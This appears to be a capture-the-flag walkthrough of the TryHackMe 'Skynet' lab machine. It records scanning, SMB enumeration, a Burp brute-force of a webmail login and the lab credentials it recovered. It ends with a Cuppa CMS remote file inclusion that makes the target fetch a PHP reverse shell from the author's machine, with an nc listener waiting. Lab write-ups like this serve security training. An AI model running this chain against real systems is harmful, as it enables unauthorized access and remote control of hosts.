@@ -1,0 +1,190 @@
+Nmap -sSVC -Pn -vv $IP
+
+ffuf -u http://10.10.69.49/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
+gobuster dir -u http://10.10.69.49/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+smbmap -H 10.10.69.49 
+[+] Guest session       IP: 10.10.69.49:445     Name: 10.10.69.49                                       
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        anonymous                                               READ ONLY       Skynet Anonymous Share
+        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
+        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
+
+smbclient //10.10.69.49/anonymous
+smb: \> ls
+  .                                   D        0  Thu Nov 26 23:04:00 2020
+  ..                                  D        0  Tue Sep 17 14:20:17 2019
+  attention.txt                       N      163  Wed Sep 18 10:04:59 2019
+  logs                                D        0  Wed Sep 18 11:42:16 2019
+ 
+smb: \> get attention.txt
+smb: \> cd logs
+smb: \> ls
+  .                                   D        0  Wed Sep 18 11:42:16 2019
+  ..                                  D        0  Thu Nov 26 23:04:00 2020
+  log2.txt                            N        0  Wed Sep 18 11:42:13 2019
+  log1.txt                            N      471  Wed Sep 18 11:41:59 2019
+  log3.txt                            N        0  Wed Sep 18 11:42:16 2019
+  
+smb: \> get log1.txt
+smb: \> exit
+cat attention.txt
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+
+cat log1.txt     
+cyborg007haloterminator
+terminator22596
+terminator219
+terminator20
+terminator1989
+terminator1988
+terminator168
+terminator16
+terminator143
+terminator13
+terminator123!@#
+terminator1056
+terminator101
+terminator10
+terminator02
+terminator00
+roboterminator
+pongterminator
+manasturcaluterminator
+exterminator95
+exterminator200
+dterminator
+djxterminator
+dexterminator
+determinator
+cyborg007haloterminator
+avsterminator
+alonsoterminator
+Walterminator
+79terminator6
+1996terminator
+
+
+Open Burp ---> clear $ ---> add $ secretkey=
+load wordlist log1.txt
+--> cyborg007haloterminator with status 302
+
+login http://10.10.69.49/squirrelmail/
+milesdyson:cyborg007haloterminator
+--->Samba Password reset--> 
+We have changed your smb password after system malfunction.
+Password: )s{A&2Z=F^n_E.B`
+
+
+smbclient //10.10.69.49/milesdyson --user milesdyson
+password: )s{A&2Z=F^n_E.B`
+
+
+- What is Miles password for his emails?
+cyborg007haloterminator
+
+smbclient //10.10.69.49/milesdyson --user milesdyson
+smb: \> ls
+  .                                   D        0  Tue Sep 17 16:05:47 2019
+  ..                                  D        0  Wed Sep 18 10:51:03 2019
+  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 16:05:14 2019
+  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 16:05:14 2019
+  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 16:05:14 2019
+  notes                               D        0  Tue Sep 17 16:18:40 2019
+  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 16:05:14 2019
+  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 16:05:14 2019
+
+smb: \>cd notes
+smb: \>ls
+                                   D        0  Tue Sep 17 16:18:40 2019
+  ..                                  D        0  Tue Sep 17 16:05:47 2019
+  3.01 Search.md                      N    65601  Tue Sep 17 16:01:29 2019
+  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 16:01:29 2019
+  2.08 In Practice.md                 N     7949  Tue Sep 17 16:01:29 2019
+  0.00 Cover.md                       N     3114  Tue Sep 17 16:01:29 2019
+  1.02 Linear Algebra.md              N    70314  Tue Sep 17 16:01:29 2019
+  important.txt                       N      117  Tue Sep 17 16:18:39 2019
+  6.01 pandas.md                      N     9221  Tue Sep 17 16:01:29 2019
+  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 16:01:29 2019
+  2.01 Overview.md                    N     1165  Tue Sep 17 16:01:29 2019
+  3.02 Planning.md                    N    71657  Tue Sep 17 16:01:29 2019
+  1.04 Probability.md                 N    62712  Tue Sep 17 16:01:29 2019
+  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 16:01:29 2019
+  2.00 Machine Learning.md            N       26  Tue Sep 17 16:01:29 2019
+  1.03 Calculus.md                    N    40779  Tue Sep 17 16:01:29 2019
+  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 16:01:29 2019
+  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 16:01:29 2019
+  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 16:01:29 2019
+  6.00 Appendices.md                  N       20  Tue Sep 17 16:01:29 2019
+  1.01 Functions.md                   N     7627  Tue Sep 17 16:01:29 2019
+  2.03 Neural Nets.md                 N   144726  Tue Sep 17 16:01:29 2019
+  2.04 Model Selection.md             N    33383  Tue Sep 17 16:01:29 2019
+  2.02 Supervised Learning.md         N    94287  Tue Sep 17 16:01:29 2019
+  4.00 Simulation.md                  N       20  Tue Sep 17 16:01:29 2019
+  3.05 In Practice.md                 N     1123  Tue Sep 17 16:01:29 2019
+  1.07 Graphs.md                      N     5110  Tue Sep 17 16:01:29 2019
+  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 16:01:29 2019
+  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 16:01:29 2019
+  5.03 Anonymization.md               N     2516  Tue Sep 17 16:01:29 2019
+  5.01 Process.md                     N     5788  Tue Sep 17 16:01:29 2019
+  1.09 Optimization.md                N    25823  Tue Sep 17 16:01:29 2019
+  1.05 Statistics.md                  N    64291  Tue Sep 17 16:01:29 2019
+  5.02 Visualization.md               N      940  Tue Sep 17 16:01:29 2019
+  5.00 In Practice.md                 N       21  Tue Sep 17 16:01:29 2019
+  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 16:01:29 2019
+  1.10 Algorithms.md                  N    28790  Tue Sep 17 16:01:29 2019
+  3.04 Filtering.md                   N    13360  Tue Sep 17 16:01:29 2019
+  1.00 Foundations.md                 N       22  Tue Sep 17 16:01:29 2019
+
+...important.txt
+smb: \>get important.txt
+smb: \>exit
+
+cat important.txt
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+
+
+- What is the hidden directory?
+/45kra24zxs28v3yd
+
+
+- What is the vulnerability called when you can include a remote file for malicious purposes?
+ffuf -u http://10.10.69.49/45kra24zxs28v3yd/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
+administrator           [Status: 301, Size: 335, Words: 20, Lines: 10]
+
+
+http://10.10.69.49/45kra24zxs28v3yd/administrator/
+---> Cuppa SMS
+
+searchsploit Cuppa
+searchsploit -p php/webapps/25971.txt
+ Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
+      URL: https://www.exploit-db.com/exploits/25971
+     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
+File Type: ASCII text, with very long lines, with CRLF line terminators
+
+cat /usr/share/exploitdb/exploits/php/webapps/25971.txt
+
+/usr/share/webshells/php/php-reverse-shell.php /home
+mv php-reverse-shell.php phpshell.php
+vi phpshell.php
+change ip = my ip
+python3 -m http.server
+
+http://10.10.69.49/45kra24zxs28v3yd/administrator//alerts/alertConfigField.php?urlConfig=http://10.6.88.227:8000/phpshell.php
+
+on my machine
+nc -lnvp 1234
+
+
+https://tryhackme.com/room/skynet
+https://whitehat.vn/threads/web-pentest-bai-2-su-dung-ky-thuat-brute-force-de-do-tim-duong-dan-va-password.14754/
+https://blog.tryhackme.com/skynet-writeup/
+
+https://github.com/Kahvi-0/Writeups/blob/master/TryHackMe/Skynet.md
+https://seceng.tech/2020/11/04/tryhackme-skynet-write-up/
